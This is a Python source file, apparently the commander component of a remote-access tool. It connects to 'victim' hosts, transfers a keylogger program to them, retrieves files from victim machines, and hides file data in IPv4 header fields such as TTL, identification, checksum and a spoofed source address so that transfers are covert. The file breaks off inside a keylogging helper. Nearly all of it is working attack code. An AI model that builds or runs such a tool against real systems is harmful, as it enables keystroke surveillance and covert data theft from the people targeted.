import datetime
import getopt
import os
import queue
import sys
import socket
import threading
import time
from scapy.layers.inet import IP
from scapy.sendrecv import send
import constants
import ipaddress
from typing import TextIO


def display_menu():
    print(constants.MENU_CLOSING_BANNER)
    print(constants.MENU_ITEM_ONE)
    print(constants.MENU_ITEM_TWO)
    print(constants.MENU_ITEM_THREE)
    print(constants.MENU_ITEM_FOUR)
    print(constants.MENU_ITEM_FIVE)
    print(constants.MENU_ITEM_SIX)
    print(constants.MENU_ITEM_SEVEN)
    print(constants.MENU_ITEM_EIGHT)
    print(constants.MENU_ITEM_NINE)
    print(constants.MENU_ITEM_TEN)
    print(constants.MENU_ITEM_ELEVEN)
    print(constants.MENU_ITEM_TWELVE)
    print(constants.MENU_ITEM_THIRTEEN)
    print(constants.MENU_ITEM_FOURTEEN)
    print(constants.MENU_ITEM_FIFTEEN)
    print(constants.MENU_CLOSING_BANNER)


def get_user_menu_option(input_stream: TextIO):
    command = input_stream.readline().strip()

    try:
        command = int(command)
        while not (constants.MIN_MENU_ITEM_VALUE <= command <= constants.MAX_MENU_ITEM_VALUE):
            print(constants.INVALID_MENU_SELECTION_PROMPT)
            print(constants.INVALID_MENU_SELECTION)
            command = sys.stdin.readline().strip()
        print(constants.MENU_ACTION_START_MSG.format(command))
        return command
    except ValueError as e:
        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
        print(constants.INVALID_MENU_SELECTION)
    except TypeError as e:
        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
        print(constants.INVALID_MENU_SELECTION)


def print_config(dest_ip: str, dest_port: int, server_address: tuple):
    print(constants.INITIAL_VICTIM_IP_MSG.format(dest_ip))
    print(constants.INITIAL_VICTIM_PORT_MSG.format(dest_port))
    print(constants.SERVER_INFO_MSG.format(*server_address))
    print(constants.MENU_CLOSING_BANNER)


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port, destination_ip, destination_port = "", "", "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments,
                                         's:c:d:p:',
                                         ["src_ip", "src_port", "dst_ip", "dst_port"])

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s' or opt == '--src_ip':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-c' or opt == '--src_port':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

        if opt == '-d' or opt == '--dst_ip':  # For destination IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                destination_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_DST_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p' or opt == '--dst_port':  # For destination port
            try:
                destination_port = int(argument)
                if not (constants.MIN_PORT_RANGE < destination_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_DST_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_DST_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    if len(destination_ip) == constants.ZERO:
        sys.exit(constants.NO_DST_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(destination_port)) == constants.ZERO:
        sys.exit(constants.NO_DST_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port, destination_ip, destination_port


def initialize_server_socket(source_ip: str, source_port: int):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind the socket to a specific host and port
        server_address = (source_ip, source_port)
        server_socket.bind(server_address)

        # Listen for incoming connections
        server_socket.listen(constants.MIN_QUEUE_SIZE)

        return server_socket
    except PermissionError as e:
        sys.exit(constants.COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))


def initial_connect_to_client(sockets_list: list, connected_clients: dict,
                              dest_ip: str, dest_port: int):
    try:
        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((dest_ip, dest_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((dest_ip, dest_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair) -> (is_keylogging, is_watching)
        connected_clients[target_socket] = (dest_ip, dest_port, False, False)
        sockets_list.append(target_socket)
        return target_socket

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        return None


def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
    try:
        # Prompt user input
        try:
            target_ip = str(ipaddress.ip_address(input("[+] Enter victim IP address: ")))
            target_port = int(input("[+] Enter victim port: "))
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))
            return False, None, None, None

        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((target_ip, target_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((target_ip, target_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair)
        connected_clients[target_socket] = (target_ip, target_port, False, False)
        sockets_list.append(target_socket)

        # Print closing statements
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

        return True, target_socket, target_ip, target_port

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False, None, None, None


def process_new_connections(server_socket: socket.socket, sockets_to_read: list,
                            client_dict: dict):
    client_socket, client_address = server_socket.accept()
    print(constants.NEW_CONNECTION_MSG.format(client_address))
    sockets_to_read.append(client_socket)
    client_dict[client_socket] = (client_address, False, False)
    print(constants.MENU_CLOSING_BANNER)


def disconnect_from_client(sockets_list: list, connected_clients: dict):
    # CHECK: If connected_clients is empty
    if len(connected_clients) == constants.ZERO:
        print(constants.DISCONNECT_FROM_VICTIM_ERROR)
    else:
        # Get prompt for target ip and port
        try:
            target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
            target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))

            # CHECK: if client is present in connected_clients list
            for client_sock, client_info in connected_clients.items():
                if client_info[:2] == (target_ip, target_port):
                    target_socket = client_sock

                    # Check if target socket is currently running keylogger
                    if client_info[2]:
                        print(constants.DISCONNECT_ERROR_KEYLOG_TRUE.format(target_ip, target_port))
                        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
                        print(constants.RETURN_MAIN_MENU_MSG)
                        print(constants.MENU_CLOSING_BANNER)
                        return None

                    # Remove client from both socket and connected_clients list
                    print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
                    sockets_list.remove(target_socket)
                    del connected_clients[target_socket]

                    # Close socket
                    target_socket.close()

                    print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
                    break
                else:
                    print(constants.DISCONNECT_FROM_VICTIM_ERROR)
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
    # Send the notification to the victim that a file transfer is about to occur
    sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
    ack = sock.recv(constants.BYTE_LIMIT).decode()

    # Open and Read the file to be sent
    if ack == constants.RECEIVED_CONFIRMATION_MSG:
        # Send file name
        sock.send(constants.KEYLOG_FILE_NAME.encode())
        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))

        # Wait for client/victim to buffer
        time.sleep(1)

        with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
            while True:
                file_data = file.read(constants.BYTE_LIMIT)
                if not file_data:
                    break
                sock.send(file_data)

        # Send end-of-file marker
        sock.send(constants.END_OF_FILE_SIGNAL)

        # Get an ACK from victim for success
        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()

        if transfer_result == constants.VICTIM_ACK:
            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
                                                            dest_ip,
                                                            dest_port))
        else:
            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))


def protocol_and_field_selector():
    """
    Prompts user of the header layer within a network packet
    to hide data in.

    Users can select the following choices:
        - IPv4, IPv6, TCP, UDP, and ICMP
        - Users then select a field

    @return: choices
        A tuple representing the header and header field chosen
    """
    # a) Initialize Variables
    index = constants.ZERO
    __print_protocol_choices()

    # b) Get header of choice
    while index <= constants.ZERO or index >= constants.MAX_PROTOCOL_CHOICE:
        try:
            index = int(input(constants.PROTOCOL_CHOICE_PROMPT))
        except ValueError as e:
            print(constants.INVALID_PROTOCOL_ERROR_MSG.format(e))

    # c) Print and Initialize Header
    header = constants.PROTOCOLS_LIST[index - 1]
    num_of_fields = len(constants.PROTOCOL_HEADER_FIELD_MAP[header])
    index = constants.ZERO  # => Reset index
    __print_header_choices(constants.PROTOCOL_HEADER_FIELD_MAP[header])

    # d) Get header field of choice
    while index <= constants.ZERO or index > num_of_fields:
        try:
            index = int(input(constants.HEADER_CHOICE_PROMPT.format(num_of_fields)))
        except ValueError as e:
            print(constants.INVALID_HEADER_ERROR_MSG.format(e))

    # e) Put Protocol and Header Field into Tuple
    header_field = constants.PROTOCOL_HEADER_FIELD_MAP[header][index - 1]
    choices = (header, header_field)

    # f) Print resulting operations
    print(constants.PROTOCOL_SELECTED_MSG.format(choices[0]))
    print(constants.FIELD_SELECTED_MSG.format(choices[1]))
    return choices


def __print_protocol_choices():
    print("[+] Please select a protocol for covert file transfer...")
    print("1 - IPv4")
    print("2 - IPv6")
    print("3 - TCP")
    print("4 - UDP")
    print("5 - ICMP")
    print(constants.MENU_CLOSING_BANNER)


def __print_header_choices(protocol_header_list: list):
    count = 1

    print("[+] Please select a header field for covert file transfer...")
    for choice in protocol_header_list:
        print("{} - {}".format(count, choice))
        count += 1
    print(constants.MENU_CLOSING_BANNER)


def __text_to_bin(text):
    return ''.join(format(ord(char), constants.BINARY_MODE) for char in text)


def __bytes_to_bin(data):
    return ''.join(format(byte, constants.BINARY_MODE) for byte in data)


# // ===================================== COVERT CHANNEL FUNCTIONS ===================================== //


def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    TTL field.

    @note Bit length
        The TTL field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Split the binary data into chunks that fit within the TTL range (0-255)
    ttl_chunk_size = 8  # MAX SIZE is 8 bits == (1 char)
    chunks = [binary_data[i:i + ttl_chunk_size] for i in range(0, len(binary_data), ttl_chunk_size)]

    # d) Send total number of packets to the client
    total_packets = str(len(chunks))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Craft packets for each chunk and embed them with a corresponding TTL value
    for i, chunk in enumerate(chunks):
        # Convert the chunk to integer (0-255)
        chunk_value = int(chunk, 2)

        # Craft an IPv4 packet with the chunk value as TTL
        packet = IP(dst=dest_ip, ttl=chunk_value)

        # Send the packet
        send(packet, verbose=0)


def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in a packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        version = int(binary_segment, 2)
        packet = IP(dst=dest_ip, version=version)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    IHL (Internet Header Length) field.

    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
        Changing the IHL field of the IP header may cause
        packets to be dropped; thus may not be a viable solution
        for covert data hiding

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i+4].ljust(4, '0')
        ihl = int(binary_segment, 2)
        packet = IP(dst=dest_ip, ihl=ihl)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 6):
        binary_segment = binary_data[i:i+6].ljust(6, '0')
        ds = int(binary_segment, 2)
        packet = IP(dst=dest_ip, tos=(ds << 2))
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 2):
        binary_segment = binary_data[i:i+2].ljust(2, '0')
        ecn = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.tos = (packet.tos & 0b11111100) | ecn  # Set first 2 bits (ECN) of ToS field
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        total_length = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.len = total_length
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        identification = int(binary_segment, 2)
        packet = IP(dst=dest_ip, id=identification)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 3):
        binary_segment = binary_data[i:i + 3].ljust(3, '0')
        flag = int(binary_segment, 2)
        packet = IP(dst=dest_ip, flags=flag)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 13):
        binary_segment = binary_data[i:i + 13].ljust(13, '0')
        fragment_offset = int(binary_segment, 2)
        packet = IP(dst=dest_ip, frag=fragment_offset)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        protocol = int(binary_segment, 2)
        packet = IP(dst=dest_ip, proto=protocol)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        checksum = int(binary_segment, 2)
        packet = IP(dst=dest_ip, chksum=checksum)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_src_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    source address field.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        src_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(src=src_ip, dst=dest_ip)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    destination address field.

    @attention: // *** THIS IS DESTINATION IP SPOOFING *** //
                Changing the destination IP field of the IP header will
                cause the packets created to be sent out to random IP
                addresses.

                The target victim will not be able to receive any
                crafted packets; hence - any covert data.

    @note Bit length
        The destination address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __text_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        dst_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(dst=dst_ip)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def __get_protocol_header_function_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): transfer_file_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): transfer_file_ipv4_ihl,
        ("IPv4", "DS (Differentiated Services Codepoint)"): transfer_file_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): transfer_file_ipv4_ecn,
        ("IPv4", "Total Length"): transfer_file_ipv4_total_length,
        ("IPv4", "Identification"): transfer_file_ipv4_identification,
        ("IPv4", "Flags"): transfer_file_ipv4_flags,
        ("IPv4", "Fragment Offset"): transfer_file_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): transfer_file_ipv4_ttl,
        ("IPv4", "Protocol"): transfer_file_ipv4_protocol,
        ("IPv4", "Header Checksum"): transfer_file_ipv4_header_chksum,
        ("IPv4", "Source Address"): transfer_file_ipv4_src_addr,
        ("IPv4", "Destination Address"): transfer_file_ipv4_dst_addr,
        ("IPv4", "Options"): "F()",
        ("IPv4", "Padding"): "F()",

        # b) IPv6 Handlers
    }


def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int, choices: tuple):
    # Initialize map
    header_field_function_map = __get_protocol_header_function_map()

    # Get User Input for File + Check if Exists
    file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))

    # Check if the file exists
    if os.path.exists(file_path):
        print(constants.TRANSFER_FILE_FOUND_MSG.format(file_path))
        print(constants.TRANSFER_FILE_INIT_MSG.format(file_path))

        # Parse File Name
        parsed_file_path = file_path.split("/")
        file_name = parsed_file_path[-1]

        # Send the notification to the victim that a file transfer is about to occur
        sock.send(constants.TRANSFER_FILE_SIGNAL.encode())
        ack = sock.recv(constants.MIN_BUFFER_SIZE).decode()

        # Open and Read the file to be sent
        if ack == constants.RECEIVED_CONFIRMATION_MSG:
            # Send file name and choices
            sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())
            print(constants.FILE_NAME_TRANSFER_MSG.format(file_name))

            # Find the choice(header/field) in map, get and call the mapped function
            if choices in header_field_function_map:
                selected_function = header_field_function_map.get(choices)

                if selected_function is not None and callable(selected_function):
                    selected_function(sock, dest_ip, file_path)
                else:
                    print(constants.CALL_MAP_FUNCTION_ERROR)
                    return None
            else:
                print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
                return None

            # Get an ACK from the victim for success
            transfer_result = sock.recv(constants.BYTE_LIMIT).decode()

            if transfer_result == constants.VICTIM_ACK:
                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
                                                                dest_ip,
                                                                dest_port))
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
            else:
                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None


def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
    # Create Downloads and Client IP directories
    sub_directory_path = __make_main_and_sub_directories(client_ip)

    # Send Signal
    print(constants.GET_FILE_SIGNAL_MSG)
    client_socket.send(constants.GET_FILE_SIGNAL.encode())

    # Get ACK and user file path, check if exists
    res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

    if res == constants.RECEIVED_CONFIRMATION_MSG:
        # Get user prompt + send to client
        file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
        file_name = file_path.split("/")[-1]
        save_file_path = sub_directory_path + "/" + file_name
        client_socket.send(file_path.encode())

        # Wait for response
        res = client_socket.recv(constants.BYTE_LIMIT).decode()

        # Receive File if exists (MUST DO: put in downloads/[client_ip])
        if res == constants.GET_FILE_EXIST:
            with open(save_file_path, constants.WRITE_BINARY_MODE) as file:
                eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker

                while True:
                    file_data = client_socket.recv(1024)
                    if not file_data:
                        break  # No more data received
                    if file_data.endswith(eof_marker):
                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                        break
                    else:
                        file.write(file_data)

            # Send ACK to victim (if good)
            if is_file_openable(save_file_path):
                print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
                client_socket.send(constants.VICTIM_ACK.encode())
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None

        else:  # If file does not exist...
            print(constants.GET_FILE_NOT_EXIST_MSG.format(file_path, client_ip, client_port))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
    else:
        print(constants.GET_FILE_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None

# // ===================================== END OF COVERT CHANNEL FUNCTIONS ===================================== //


def is_file_openable(file_path):
    try:
        with open(file_path, constants.READ_MODE) as file:
            pass
        return True
    except IOError as e:
        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
        return False


def __is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
